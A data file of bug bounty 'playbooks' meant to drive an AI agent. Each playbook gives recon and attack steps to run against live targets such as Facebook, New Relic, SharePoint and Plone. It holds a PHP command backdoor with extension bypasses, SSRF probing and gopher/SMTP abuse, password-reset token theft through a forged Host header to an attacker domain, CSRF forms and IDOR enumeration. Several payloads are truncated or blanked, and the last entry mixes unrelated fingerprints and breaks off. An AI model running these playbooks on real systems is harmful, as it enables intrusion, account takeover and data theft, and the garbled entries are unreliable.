description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Content Injection in DuoLingo's TinyCards App for Android [CVE-2017-16905]
meta.programs: DuoLingo, Google Play Security Reward Program
meta.bounty: paid from Google Play Security Reward Program

affected_components: WebView component responsible for loading initial web content
tech_stack_fingerprints: Initial HTTP request to a non-HTTPS site before redirecting to HTTPS

trigger_conditions.when_to_apply: When the target application uses an Android WebView to load initial web content and does not enforce HTTPS for the very first request.
prerequisites: Attacker can perform a Man-in-the-Middle (MITM) attack on the target device's network traffic.
applicability_signals: Application uses Android WebView.
Network traffic analysis reveals the initial content load uses HTTP before redirecting to HTTPS.
The application's primary function involves loading remote web content.
skip_if: The application strictly enforces HTTPS for all initial network requests.
The application does not use a WebView to load external web content.

recon_steps: Step 1: Intercept network traffic from the Android device using tools like Burp Suite or mitmproxy.
Step 2: Monitor the initial connection made by the TinyCards app upon startup to identify the URL and protocol used for loading web content.
attack_steps: Step 1: Set up a local HTTP server (e.g., NGINX) on a controlled machine within the same network as the target Android device.
Step 2: Configure the Android device's DNS settings to point to the attacker's controlled machine.
Step 3: Modify the device's `/etc/hosts` file (or use DNS poisoning techniques) to redirect the target domain (e.g., `tinycards.duolingo.com`) to the attacker's local IP address.
Step 4: Place a malicious `index.html` file (or other web content) on the attacker's local HTTP server.
Step 5: Instruct the user to open the TinyCards application on the Android device.
Step 6: Observe that the malicious content is loaded into the WebView.
payloads_or_patterns: echo powned > index.html (basic proof of content injection)
JavaScript code to execute within the WebView for demonstrating RCE, e.g., `alert('XSS')` or more complex payloads to interact with app functionalities.
tools_recommended: Burp Suite or mitmproxy for network traffic interception.
NGINX or a similar HTTP server for serving malicious content.
dnsmasq for DNS configuration.
Android debugging tools or root access to modify `/etc/hosts` if needed.
success_indicators: The malicious content (e.g., 'powned' text, JavaScript alert box) is displayed within the TinyCards app's WebView.
Arbitrary JavaScript is executed within the app's context, as defined by the Google Play Security Reward Program (GPSRP) for RCE.
failure_indicators: The application loads the legitimate content instead of the attacker's payload (e.g., due to HSTS or immediate HTTPS enforcement).
Network requests are blocked or return errors indicating an inability to connect to the attacker's server.
A 404 error or similar indicates the malicious file was not served correctly.

playbooks.impact: An attacker performing a Man-in-the-Middle (MITM) attack can inject arbitrary content into the DuoLingo TinyCards Android application. This can lead to the execution of arbitrary JavaScript within the app's WebView, which Google classifies as Remote Code Execution (RCE). This could potentially be used for phishing attacks, UI manipulation, or other malicious actions that leverage the app's functionality and permissions.
playbooks.key_lesson: Always enforce HTTPS for all network requests, especially for the initial loading of web content into WebViews, to prevent MITM-based content injection and code execution vulnerabilities.

meta.title: Abusing internal API to achieve IDOR in New Relic

trigger_conditions.when_to_apply: When an authenticated user can identify internal API endpoints that reference account numbers and do not properly validate ownership of the requested account.
prerequisites: Authenticated access to New Relic.
applicability_signals: Existence of endpoints under `/internal_api/` subdomains like `alerts.newrelic.com` or `infrastructure.newrelic.com`.
API endpoints containing numeric account identifiers that appear to be sequential or enumerable.
skip_if: Internal API endpoints are inaccessible or require administrative privileges.
All internal API requests are validated against the authenticated user's account ID.

recon_steps: Identify internal API endpoints by inspecting JavaScript files loaded by the New Relic web application, looking for references to `/internal_api/`.

Observe network traffic in Burp Suite or browser developer tools while logged into New Relic, specifically targeting requests to `alerts.newrelic.com` and `infrastructure.newrelic.com` that contain `/internal_api/`.
attack_steps: Identify a vulnerable endpoint such as `https://alerts.newrelic.com/internal_api/1/accounts/{ACCOUNT NUMBER}/incidents`.
Obtain the account number of the authenticated user.
Use Burp Intruder or a similar tool to enumerate account numbers by incrementing the `{ACCOUNT NUMBER}` in the request.
Send requests to `https://alerts.newrelic.com/internal_api/1/accounts/<OTHER_ACCOUNT_NUMBER>/incidents` using the authenticated user's session cookies.
Analyze responses for data belonging to other accounts.
tools_recommended: Burp Suite (Intruder for enumeration, Proxy for traffic analysis)
Browser Developer Tools
success_indicators: Receiving a 200 OK response containing data (account events, messages, violations, policy summaries, account settings) that does not belong to the authenticated user's account.
Observing a different user's account information in the response body.
failure_indicators: Receiving a 403 Forbidden or 401 Unauthorized response for all attempted account numbers.
Receiving a 404 Not Found for all attempted account numbers.
If successful enumeration requires knowledge of specific account formats or patterns beyond simple sequential incrementing, consider this a failure for this specific enumeration method.

playbooks.impact: Access to sensitive account data including account events, account messages, violations, policy summaries, and account settings for any New Relic account.
playbooks.key_lesson: Always test internal API endpoints for IDOR vulnerabilities by enumerating or fuzzing identifier parameters (like account numbers) when authenticated, as authorization checks may be bypassed if they are not strictly enforced against the authenticated user's context.

meta.title: How I found SSRF on TheFacebook.com

tech_stack_fingerprints: Universal Description Discovery and Integration (UDDI) functionality running on Oracle WebLogic web server

trigger_conditions.when_to_apply: When a web application exposes a UDDI explorer page that accepts user input for registry searches and potentially makes outbound requests.
prerequisites: The target application must be running UDDI functionality.
The UDDI explorer page must accept user-supplied values for the 'operator' parameter.
applicability_signals: Presence of the URL '/uddiexplorer/SearchPublicRegistries.jsp'.
The 'operator' parameter is present in the request.
skip_if: The 'operator' parameter is not present or is strictly validated.
The application performs strict IP address or domain validation before making outbound requests.

recon_steps: Step 1: Navigate to https://esbmbltest.thefacebook.com/uddiexplorer/SearchPublicRegistries.jsp to identify the UDDI explorer page.
Step 2: Submit any valid search query on the page and capture the HTTP request using a proxy tool (e.g., Burp Suite, IronWASP).
attack_steps: Step 1: In the captured request, locate the 'operator' parameter.
Step 2: Change the value of the 'operator' parameter to a public IP address (e.g., 8.8.8.8).
Step 3: Forward the modified request and observe the response for a successful connection indication (e.g., similar response time as a legitimate request).
Step 4: Change the value of the 'operator' parameter to an internal IP address range (e.g., 192.168.1.1).
Step 5: Forward the modified request and measure the response time. A significant time delay (800-900 ms) indicates the host is up and running.
Step 6: To confirm enumeration, use a tool like IronWASP's SSRF Exploitation Framework to scan for active internal IPs within a given range.
tools_recommended: Burp Suite or IronWASP for intercepting and modifying requests.
IronWASP SSRF Exploitation Framework for network discovery and port scanning.
success_indicators: A response time delay of 800-900 milliseconds when probing internal IPs, indicating the host is reachable.
Successful enumeration of active internal IP addresses within a specified range.
failure_indicators: No significant time delay when probing internal IPs, suggesting they are not reachable or the 'operator' parameter is not truly vulnerable to SSRF.
A 120,000 milliseconds (2 minutes) delay might indicate the host is down, but does not confirm successful SSRF exploitation on an active host.

playbooks.impact: The attacker can probe internal network infrastructure, discover active hosts and services within a firewalled environment, and potentially identify further attack vectors by enumerating internal IPs.
playbooks.key_lesson: Test UDDI explorer endpoints, especially those with an 'operator' parameter, for SSRF vulnerabilities by substituting internal and external IP addresses to gauge reachability and discover internal infrastructure.

meta.title: Microsoft SharePoint's 'Follow' Feature XSS (CVE-2017–8514)

trigger_conditions.when_to_apply: When a SharePoint site allows sharing and the `SiteName` parameter is reflected in the DOM without proper encoding within a JavaScript context.
prerequisites: The target is a Microsoft SharePoint instance.
The attacker has the ability to craft a URL that includes the `FollowSite` and `SiteName` parameters.
applicability_signals: The presence of a URL structure like `https://<Any SharePoint URL Goes Here>?FollowSite=0&SiteName=<AnySiteNameGoesHere>`.
Observation of inline JavaScript that reflects the `SiteName` parameter within single quotes.
skip_if: The `SiteName` parameter is properly encoded before being reflected in the JavaScript context.
A Web Application Firewall (WAF) blocks payloads containing single quotes or other special characters within the `SiteName` parameter.

recon_steps: Identify a SharePoint instance and navigate to a page that allows sharing or following sites.
Observe the URL parameters when using the 'Follow' or 'Share' features, specifically looking for `FollowSite` and `SiteName`.
attack_steps: Construct a URL with the `FollowSite` parameter set to 0 and the `SiteName` parameter containing the XSS payload.
Send the crafted URL to a victim user via a method like email or chat.
Observe if the payload executes in the victim's browser when they click the link.
tools_recommended: Burp Suite: To craft and modify URLs, and to capture requests/responses.
A simple text editor: For constructing the payload and URL.
success_indicators: An alert box pops up displaying the domain of the target site (e.g., `document.domain`).
The XSS payload is executed in the context of the victim's browser session on the SharePoint site.
failure_indicators: No alert box appears and the page loads normally. This might indicate the `SiteName` parameter is not reflected or is properly sanitized.
A 403 Forbidden error or a WAF block message is received, indicating security controls are in place. Pivot to obfuscation techniques or different injection vectors.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser session on the SharePoint site. This can lead to session hijacking, credential theft, defacement, or further exploitation within the SharePoint environment.
playbooks.key_lesson: Always test URL parameters reflected within JavaScript contexts for proper output encoding, especially when they are enclosed in quotes.

meta.title: Account Takeover Due to Misconfigured Login with Facebook/Google

target_profile.technology: Mobile Applications using Login with Facebook/Google
affected_components: OAuth/Social Login Implementation (Facebook Login, Google Login)
tech_stack_fingerprints: Presence of 'Login with Facebook' or 'Login with Google' buttons in mobile applications.

trigger_conditions.when_to_apply: When a mobile application integrates 'Login with Facebook' or 'Login with Google' and the backend token validation is misconfigured.
prerequisites: The target application uses Facebook Login or Google Login for user authentication.
The attacker has the ability to create a malicious application registered with the same social login provider (Facebook or Google).
applicability_signals: Application prompts users to log in using Facebook or Google.
The application's backend API that validates social login tokens is accessible.
skip_if: The application does not offer Facebook or Google login.
The social login provider strictly enforces app secret validation by default for all API calls.

recon_steps: Identify mobile applications that offer 'Login with Facebook' or 'Login with Google' as an authentication option.
Analyze the network traffic of the application during the login process to understand how access tokens or ID tokens are sent to the backend for validation.
attack_steps: Step 1: Obtain an access token or ID token from a legitimate user for the target application (e.g., by tricking a user into logging into a malicious app that uses the same social provider).

Step 2: Send this obtained token to the target application's backend API endpoint responsible for token validation, without performing the `appsecret_proof` check for Facebook or the `aud` (audience) check for Google.
Step 3: If the backend accepts the token and grants access or creates a session for the user associated with that token, an account takeover is successful.
tools_recommended: Burp Suite: To intercept and modify HTTP requests during the social login process.
Charles Proxy: For mobile application traffic analysis.
success_indicators: The backend API returns user details (email, name, user ID) associated with the victim's account.
A valid session cookie is returned by the target application's backend, allowing access to the victim's account.
failure_indicators: The backend API returns an error indicating an invalid token or unauthorized access (e.g., 401 Unauthorized, 403 Forbidden). This could indicate that the `appsecret_proof` or `aud` validation is correctly implemented. Pivot: Investigate other authorization flaws or client-side vulnerabilities.
The backend API consistently returns the same user details regardless of the token provided. This might suggest an issue with session management rather than token validation.

playbooks.impact: An attacker can gain unauthorized access to any user's account within the misconfigured application by leveraging valid access or ID tokens generated for other applications by the same social login provider. This allows the attacker to perform actions on behalf of the victim user, access their data, and potentially escalate privileges.
playbooks.key_lesson: Always validate the `appsecret_proof` parameter for Facebook access tokens and the `aud` (audience) claim for Google ID tokens on the backend to ensure they were generated specifically for your application.

meta.title: P4 to P2 - The story of one blind SSRF

trigger_conditions.when_to_apply: When a web application allows uploading files in HTML format and processes them, and there's a filter that blocks 'file://' but not variations with spaces or unusual characters.
prerequisites: User can upload HTML files.
The uploaded HTML is processed server-side, potentially by a rendering engine or parser.
A filter exists that blocks direct use of 'file://' but can be bypassed.
applicability_signals: Ability to upload and process HTML files.
Evidence of server-side processing of uploaded HTML (e.g., external sniffer being hit from an uploaded HTML file containing a link).
Observation that 'file://' is blocked but 'file :///' (with a tab) or similar variations are not.
skip_if: No file upload functionality.
Uploaded HTML is not processed server-side.
A strict filter blocks all attempts to access local files, even with bypass techniques.

recon_steps: Step 1: Identify the file upload functionality and test allowed file types. Attempt to upload an HTML file containing a simple link to an external sniffer (e.g., Burp Collaborator) to confirm server-side processing. Observe if the sniffer receives a request.
Step 2: Experiment with different HTML content, including script tags and basic local file access attempts like 'file://C:/Windows/win.ini'. Note any filtering or blocking behavior.

Step 3: Identify if the 'file://' string is blocked. Attempt to bypass the filter by inserting spaces or unusual characters after 'file' and before '://', for example, 'file :///' (with a tab character). Upload HTML files with these bypassed patterns and observe server-side behavior (e.g., error messages, slow responses, or callbacks to an external sniffer).
attack_steps: Step 1: Craft an HTML payload targeting a known-to-exist local file on the web server, such as a default browser icon. For Internet Explorer, this could be 'C:\Program Files\Internet Explorer\images\bing.ico'.
Step 2: Embed this local file path within an `` tag, using the bypassed 'file :///' syntax: ``.
Step 3: Upload this crafted HTML file through the receipt upload functionality.

Step 4: Monitor for any observable side effects. Since this is blind SSRF, success might not be directly visible in the response. Look for subtle changes in response time, error messages, or if possible, indirectly confirm access to the local resource through another mechanism if available (e.g., if the image content could be further exfiltrated).
tools_recommended: Burp Suite (or similar proxy) for intercepting and modifying requests, and for setting up an external collaborator client.
A simple web server to host test HTML files if direct upload isn't available.
success_indicators: No direct confirmation of success is described. The writeup indicates a change in bug severity (P4 to P2), implying some level of local resource access was achieved, but the specific observable was not detailed. A potential success indicator would be a callback to an external sniffer from a resource that should only be locally accessible.
Error messages that suggest the server attempted to access the specified local file path.
failure_indicators: Uploaded HTML files are rejected or not processed.
The 'file :///' bypass attempt is also filtered out.
No observable side effects or confirmation of local file access.
Any attempt to access resources using 'file://' (even bypassed) results in a generic error or is silently ignored.

playbooks.impact: Unauthorized access to local files on the web server. This could lead to the disclosure of sensitive information such as configuration files, system information, or even credentials, depending on the file accessed. In a blind SSRF scenario, the impact is often limited by the ability to exfiltrate data from the accessed local resource.
playbooks.key_lesson: When encountering filters for local file access schemes like 'file://', investigate variations with spaces or unusual delimiters, as these can sometimes bypass naive filtering implementations.

meta.title: Unrestricted File Upload to RCE

trigger_conditions.when_to_apply: When an authenticated user can upload a profile image and the application does not adequately validate file extensions or content for uploaded files, allowing for the execution of arbitrary code.
prerequisites: Authenticated access to the target application
The ability to upload a profile image
applicability_signals: The upload endpoint accepts common image extensions (JPG, PNG, GIF)
The application constructs URLs for uploaded images using user IDs and filenames.
Requests to the upload endpoint include parameters for filename and mime type.
A PUT request is used for the actual file upload to a specific directory.
skip_if: Strict file extension validation (e.g., only allows specific image types and rejects all others)
Server-side content validation that prevents executing code within uploaded files.
The application sanitizes or removes executable code from uploaded files.

recon_steps: Step 1: Log in to the target application as an authenticated user.
Step 2: Navigate to the profile settings and attempt to upload a valid image file (e.g., .jpg). Observe the URL where the image is stored.
Step 3: Intercept the request when uploading an image and note any parameters related to filename and mime type.
Step 4: Observe the HTTP method and endpoint used for the actual file upload.
Step 5: Attempt to upload files with non-image extensions (e.g., .txt, .html, .php) to identify extension filtering mechanisms.
attack_steps: Step 1: Identify the GET request used by the application to process uploads, noting the `name` and `mime` parameters. Example: `GET <TARGET_URL>/settings/<USER_ID>/avatar?name=test.png&mime=image%2Fpng`.

Step 2: Modify the `name` and `mime` parameters in the GET request to specify a desired filename and content type for a malicious payload (e.g., `name=shell.phps`, `mime=text%2Fphp`). Example: `GET <TARGET_URL>/settings/<USER_ID>/avatar?name=shell.phps&mime=text%2Fphp`.

Step 3: Immediately after the modified GET request, initiate a PUT request to upload the malicious payload. The target URL for the PUT request will be similar to the image storage URL, incorporating the modified filename. Example: `PUT <TARGET_URL>/users/<USER_ID>/shell.phps` with the payload in the request body.

Step 4: If the initial attempt with a common backdoor extension (e.g., `.php`) fails with a 403 error, try alternative PHP extensions that might bypass filters (e.g., `.phps`, `.php3`, `.php4`, `.php5`).
Step 5: Access the uploaded malicious file via its URL, passing a command to the backdoor. Example: `<TARGET_URL>/users/<USER_ID>/shell.phps?cmd=cat+/etc/passwd`.
payloads_or_patterns: PHP backdoor payload: `' ) ; $cmd = ( $_REQUEST [ 'cmd' ]); system ( $cmd ); echo ( '' ) ; die ; } ?>`
GET request template for modifying upload parameters: `<TARGET_URL>/settings/<USER_ID>/avatar?name=<PAYLOAD_FILENAME>&mime=<PAYLOAD_MIME_TYPE>`
PUT request template for uploading payload: `PUT <TARGET_URL>/users/<USER_ID>/<PAYLOAD_FILENAME>`
tools_recommended: Burp Suite: To intercept and modify HTTP requests (GET and PUT), and to observe request/response details.
A text editor: To create the malicious PHP backdoor payload.
success_indicators: A 200 OK response when accessing the uploaded malicious file.
The output of the executed command (e.g., `cat /etc/passwd` showing the content of the passwd file) is returned in the HTTP response.
Receiving a 200 OK response when attempting to upload a file with an alternative PHP extension (e.g., `.phps`).
failure_indicators: 403 Forbidden error when trying to upload or access the malicious file: Indicates that either the extension is still blocked or the file content is being rejected.
500 Internal Server Error: Might indicate issues with the file content or how the server is processing it.
No output or unexpected output when executing commands: Suggests the backdoor is not executing commands correctly or the file is not being interpreted as PHP.

playbooks.impact: Remote Code Execution (RCE) on the server, allowing an attacker to execute arbitrary commands, read sensitive files, modify data, or take full control of the compromised server.
playbooks.key_lesson: When file uploads are allowed, thoroughly test for unrestricted file uploads by attempting to upload non-image files and consider bypassing extension filters using alternative extensions or by manipulating request parameters that control the file type.

meta.title: LFI to 10 servers pwn

trigger_conditions.when_to_apply: When a web application is vulnerable to Local File Inclusion (LFI) and allows arbitrary file reads from the server, which can then be leveraged to achieve Remote Code Execution (RCE) by including server-side files used in web application logic.
prerequisites: The target application must be vulnerable to LFI.
applicability_signals: Successful inclusion of common system files like `/etc/passwd` or application configuration files via a parameter that appears to handle file paths.
skip_if: The server sanitizes file paths effectively, preventing LFI. WAF blocks common LFI payloads.

recon_steps: Step 1: Identify parameters that might be vulnerable to LFI by fuzzing input fields and URL parameters with common file path traversal sequences (e.g., `../../etc/passwd`, `../etc/passwd%00`).
Step 2: Attempt to include sensitive files such as `/etc/passwd`, application log files, or configuration files to confirm LFI vulnerability.
attack_steps: Step 1: Once LFI is confirmed, identify a file that can be used to achieve RCE. This often involves including a file that the web server or application executes, such as a script that parses uploaded files or a template engine file.

Step 2: Craft a payload that, when included by the LFI vulnerability, results in code execution. For example, if the application processes uploaded files, and an uploaded file with specific content is parsed, then including that file might lead to RCE.

Step 3: Leverage the LFI to include a file that allows writing to a web-accessible directory (e.g., a temporary upload directory) or directly inject malicious code into a script or configuration file that will be executed later.

Step 4: If the direct LFI to RCE is not possible, use LFI to read sensitive files like configuration files that may contain database credentials or API keys, potentially leading to further compromise or enabling RCE through other means.
payloads_or_patterns: insufficient detail in writeup for RCE payloads
insufficient detail in writeup for the specific files leading to RCE on 10 servers
tools_recommended: Burp Suite (Scanner, Repeater, Intruder)
Nikto
FFUF
success_indicators: Response displays the content of sensitive system files (e.g., `/etc/passwd`).
Successful execution of arbitrary commands on the server, confirmed by observing command output or side effects (e.g., creating a file, reverse shell connection).
failure_indicators: 403 Forbidden or 404 Not Found responses when attempting to include files.
Input sanitization preventing path traversal.
WAF blocking payloads.

playbooks.impact: Remote Code Execution on the target server, leading to full system compromise. The writeup mentions compromising 10 servers, implying widespread impact through exploitation of LFI across multiple instances or related systems.
playbooks.key_lesson: When LFI is found, investigate including server-side application files or scripts that handle user input or parsing to escalate to Remote Code Execution. Read sensitive configuration files to gather further credentials.

meta.title: Hacking the Hackers: Leveraging an SSRF in HackerTarget

trigger_conditions.when_to_apply: When a web application makes outbound HTTP requests based on user-supplied input, particularly URLs or hostnames, and fails to properly validate the destination.
prerequisites: The target application must have an endpoint that accepts a URL or hostname as a parameter and performs a server-side request to it.
applicability_signals: Presence of an endpoint like /httpheaders/?q=<target>
The application's ability to fetch and display HTTP headers from an external target.
skip_if: The application strictly validates destination IPs to be within a predefined allowlist or blocks all private IP ranges.
WAF blocks common SSRF bypasses.

recon_steps: Step 1: Identify endpoints that take URLs or hostnames as parameters. Use DNSDumpster's 'Get HTTP Headers' button as an initial signal.
Step 2: Test the identified endpoint with common internal IP addresses like 127.0.0.1 and 0.0.0.0 to observe if the application attempts to connect.
attack_steps: Step 1: Attempt to bypass basic IP address blacklisting (e.g., 127.0.0.1) using various IP octal, hexadecimal, and alternative representations (e.g., 0177.1, 0x7f.0x0.0x0.0x1, localtest.me).
Step 2: Use a script to enumerate open ports on internal IP addresses by appending them to the SSRF URL (e.g., http://0177.1:<port>).
Step 3: If internal services are discovered (e.g., SSH on 22, SMTP on 25), attempt to interact with them using different URI schemes like `dict://` or `gopher://`.
Step 4: Craft a PHP file on an attacker-controlled server that uses the `Location` header to redirect the SSRF request to a target port, allowing for multiline commands (using `gopher://`).
Step 5: Create another PHP file on the attacker's server to redirect the SSRF to the internal SMTP server, sending valid SMTP commands to send an email.
payloads_or_patterns:
HELO hackertarget.com
MAIL FROM: <admin@hackertarget.com>
RCPT To: <victim@email.com>
DATA
Subject: cdl!
Corben was here, woot woot!
.
tools_recommended: Burp Suite: For intercepting and modifying requests, testing different SSRF payloads.
Netcat (nc): For listening on specific ports and observing incoming connections.
Custom Bash Script: To automate port scanning and discovery.
Attacker-controlled web server: To host PHP files for redirects and payload delivery.
success_indicators: Receiving HTTP headers from an internal IP address (e.g., 127.0.0.1).
Successful connection to internal services like SSH or SMTP indicated by specific banner responses.
Receiving a multiline request on an attacker-controlled listener (e.g., Netcat) when using `gopher://` or a PHP redirect.
Successful sending of an email from the internal SMTP server.
failure_indicators: Receiving connection refused or timeout errors for all tested internal IPs and ports: The target might have strict firewalling or no internal services exposed.
Receiving generic error pages or generic HTTP headers for all SSRF attempts: The application might be sanitizing input more rigorously than expected.
Consistent 403 Forbidden responses: May indicate a WAF is blocking SSRF attempts.

playbooks.impact: Ability to probe internal network services, potentially interact with internal servers using protocols beyond HTTP/HTTPS, and in this specific case, send emails from the compromised internal SMTP server.
playbooks.key_lesson: When testing SSRF, do not rely solely on basic IP address filtering. Attempt various bypass techniques and leverage different URI schemes (e.g., gopher://, dict://) to interact with a wider range of internal services.

meta.title: Don't Trust the Host Header for Sending Password Reset Emails

trigger_conditions.when_to_apply: When a web application implements password reset functionality and dynamically constructs reset links using the 'Host' HTTP header.
prerequisites: Target application has a password reset feature.
Target application's password reset email generation is vulnerable to Host header manipulation.
applicability_signals: Password reset emails contain links where the domain appears to be dynamically determined.
Target application accepts arbitrary hostnames in the 'Host' header.
skip_if: Password reset links are hardcoded.
Application strictly validates the 'Host' header against a predefined list of allowed domains without allowing subdomains or special characters.
No password reset functionality is present.

recon_steps: Step 1: Initiate a password reset for a known user account.
Step 2: Inspect the generated password reset email for the structure of the reset link. Observe if the domain in the link is dynamic.
Step 3: If dynamic, attempt to modify the 'Host' header in the initial password reset request to a controlled domain (e.g., your-burp-collaborator.net).
Step 4: Observe if the 'Host' header is reflected in the password reset email's link.
Step 5: If direct injection of a foreign domain fails, test special characters like '?' to bypass validation on subdomains, as demonstrated with '?'.mavenlink.com.
attack_steps: Step 1: Send a POST request to the password reset endpoint (e.g., /forgot-password) for a target user's email address.

Step 2: In the request, set the 'Host' header to a controlled domain followed by a special character that allows bypassing validation (e.g., 'attacker.com?'). Append the legitimate domain or subdomain that the server expects after the special character (e.g., 'attacker.com?.mavenlink.com').
Step 3: Receive the password reset email.
Step 4: Click the reset link, which should now point to the attacker-controlled domain.
Step 5: The password reset token will be sent to the attacker's domain via the generated link.
tools_recommended: Burp Suite: Intercept password reset requests and modify the 'Host' header.
Burp Collaborator: To receive the password reset token from the victim's click.
success_indicators: Password reset email contains a link pointing to the attacker's domain.
Attacker receives the password reset token on their controlled domain (e.g., via Burp Collaborator).
Attacker is able to successfully reset the victim's password using the stolen token.
failure_indicators: Password reset email still contains a link to the legitimate domain.
Server returns an error during the password reset request indicating an invalid Host header.
No password reset email is sent after the manipulated request.
The special character is stripped or URL encoded, preventing the intended redirection.

playbooks.impact: Account takeover of any user who requests a password reset, by stealing their password reset token.
playbooks.key_lesson: Never trust the 'Host' HTTP header for constructing security-sensitive URLs, such as password reset links. Always use server-side configuration or whitelisted values to determine the correct domain for such links.

meta.title: How I was able to takeover Facebook account

trigger_conditions.when_to_apply: When the 'Login with phone' functionality is active and presents a QR code for login, and the `fb_dtsg` parameter can be manipulated.
prerequisites: Victim initiates the 'Login with phone' process.
Attacker can intercept or guess the QR code URL.
applicability_signals: The 'Login with phone' button displays a QR code.
The QR code decodes to a URL containing parameters like `n`, `d`, `ext`, and `hash`.
skip_if: The 'Login with phone' functionality is not present or does not use a QR code.
The QR code URL does not contain exploitable parameters.
The `fb_dtsg` parameter is not present or is not mutable.

recon_steps: Step 1: Navigate to the Facebook login page and observe the 'Login with phone' option.
Step 2: Initiate the 'Login with phone' process to observe the QR code generation.
Step 3: Decode the QR code to obtain the associated URL and analyze its parameters.
attack_steps: Step 1: Initiate the 'Login with phone' flow and capture the QR code URL.
Step 2: Send the QR code URL to Burp Suite Repeater.
Step 3: Observe the HTTP request generated when the victim scans the QR code (or when the attacker simulates it by visiting the URL).
Step 4: Identify the `fb_dtsg` parameter in the request.
Step 5: Modify the `fb_dtsg` value to a known valid token (e.g., obtained from a separate authenticated session or by guessing common valid values).
Step 6: Replay the modified request.
Step 7: If the request is accepted, create a CSRF form targeting the modified URL with the altered `fb_dtsg` value.
Step 8: Trick the victim into visiting the CSRF form, which will trigger the login to the attacker's account.
payloads_or_patterns: CSRF form payload (example): <form action='https://m.facebook.com/xdl/approve/?n=<param_n>&d=<param_d>&ext=<param_ext>&hash=<param_hash>' method='POST'><input type='hidden' name='fb_dtsg' value='<MODIFIED_FB_DTSG_VALUE>'><input type='submit' value='Submit'></form>
tools_recommended: Burp Suite Repeater: To capture, modify, and replay HTTP requests.
QR Code Decoder: To extract URLs from QR codes.
Burp Suite Collaborator (optional): To detect blind interactions if applicable.
success_indicators: The modified request to the QR code approval URL is accepted without errors.
The victim, upon visiting the CSRF form, logs into the attacker's account.
The attacker receives a confirmation of successful login (e.g., via session takeover or account access).
failure_indicators: The modified request is rejected with an error (e.g., invalid `fb_dtsg`, session expired). This might indicate the need for a more dynamic `fb_dtsg` acquisition or a different attack vector.
The CSRF form submission does not result in a login. This could be due to insufficient privileges of the `fb_dtsg` value or other security checks.

playbooks.impact: An attacker can gain full control of a victim's Facebook account by leveraging the CSRF vulnerability in the 'Login with phone' QR code approval process, leading to account takeover.
playbooks.key_lesson: Always thoroughly test authentication flows involving QR codes or multi-factor authentication for potential CSRF vulnerabilities and improper validation of session tokens like `fb_dtsg`.

meta.title: Multiple Plone Cross-Site Scripting Vulnerabilities

trigger_conditions.when_to_apply: This playbook applies when testing a Plone CMS instance that is vulnerable to XSS attacks in its login or personal information pages. The first XSS vulnerability is specifically exploitable in Firefox due to its handling of 302 redirects.
prerequisites: An authenticated user account for the target Plone instance.
The target Plone version is between 2.5.5 and 5.1rc1 (inclusive).
applicability_signals: Presence of a login form that redirects after authentication.
A user profile or personal information page where the 'home page' field is editable.
The `came_from` parameter is present in the login request and reflected unsanitized in the 302 redirect response.
skip_if: No login functionality is present.
All user-editable fields in the personal information page are properly sanitized.
The target instance is known to be patched against CVE-2017-1000124 and CVE-2017-1000125.

recon_steps: Step 1: Navigate to the Plone login page to identify the parameters used in the login request.
Step 2: Log in with a valid user account and observe the redirection URL, noting any parameters like 'came_from'.
Step 3: Access the personal information editing page for a logged-in user and identify the 'home page' field.
attack_steps: Step 1: (Login XSS & CSRF - Firefox specific) Craft a malicious URL targeting the Plone login endpoint. Set the 'came_from' parameter to a value that starts with 'mailto:' and contains HTML tags, e.g., `https:///login?came_from=mailto:`.

Step 2: (Login XSS & CSRF - Firefox specific) Trick a victim user (who is logged into Plone) into visiting the crafted URL. In Firefox, this will trigger the XSS payload within the 302 redirect response.
Step 3: (Personal Homepage XSS) Log in as a user and navigate to the personal information page.
Step 4: (Personal Homepage XSS) In the 'home page' field, enter a malicious JavaScript payload, e.g., `javascript:alert(1)`.
Step 5: (Personal Homepage XSS) Save the changes and visit the attacker-controlled personal information page (or trick a victim into visiting it) to trigger the XSS.

Step 6: (Optional - Login XSS & CSRF) To exploit the CSRF aspect for the login XSS, create an HTML page with a form that auto-submits a POST request to the Plone login endpoint with malicious `came_from` parameter, aiming to hijack a logged-in user's session.
payloads_or_patterns: CSRF form for login: `<form action='https://<TARGET_URL>/login' method='post'><input type='hidden' name='came_from' value='<URL_ENCODED_MALICIOUS_PAYLOAD>'><script>document.forms[0].submit()</script></form>`
tools_recommended: Burp Suite: To capture and modify login requests, and to host the CSRF exploit page.
Browser Developer Tools: To inspect HTTP responses and client-side behavior.
success_indicators: An alert box with 'XSS' appearing in the victim's browser (for both XSS vulnerabilities).
Successful session hijacking or execution of arbitrary code within the victim's browser context.
The response to the login request contains executable JavaScript within the `came_from` parameter's reflected value.
failure_indicators: No alert box appears, and no JavaScript execution is observed. This indicates proper sanitization. Pivot to other vulnerabilities.
The browser does not execute HTML within a 302 redirect response (especially if not using Firefox with 'mailto:' bypass). Check WAF rules or if Plone version is patched.
POST request to login endpoint with malicious `came_from` does not lead to XSS execution. Verify CSRF protection or token mechanisms.

playbooks.impact: Execution of arbitrary JavaScript in the victim's browser, leading to account takeover, session hijacking, and potentially full control of the Plone web server if the victim has administrative privileges.
playbooks.key_lesson: Always test user-controlled parameters reflected in HTTP redirects and user profile fields for XSS vulnerabilities, paying attention to browser-specific behaviors (like Firefox's 302 handling) and CSRF implications.

meta.title: SQL Injection in rog.asus.com

tech_stack_fingerprints: Server responds with X-Powered-By: Express (mentioned implicitly by Next.js and TailwindCSS in footer)

trigger_conditions.when_to_apply: When the target application uses vBulletin 4.2.3 with the ForumRunner module enabled and accessible.
prerequisites: The ForumRunner module is enabled and accessible on the target vBulletin instance.
applicability_signals: The presence of the /forumrunner/request.php endpoint.
vBulletin version 4.2.3 identified.
ForumRunner module identified as core and enabled by default.
skip_if: vBulletin version is not 4.2.3.
ForumRunner module is not present or disabled.

recon_steps: Step 1: Identify the vBulletin version and check for the presence and status of the ForumRunner module. Look for observable strings like 'vBulletin 4.2.3' or specific ForumRunner related file paths in HTTP responses or linked JavaScript files.
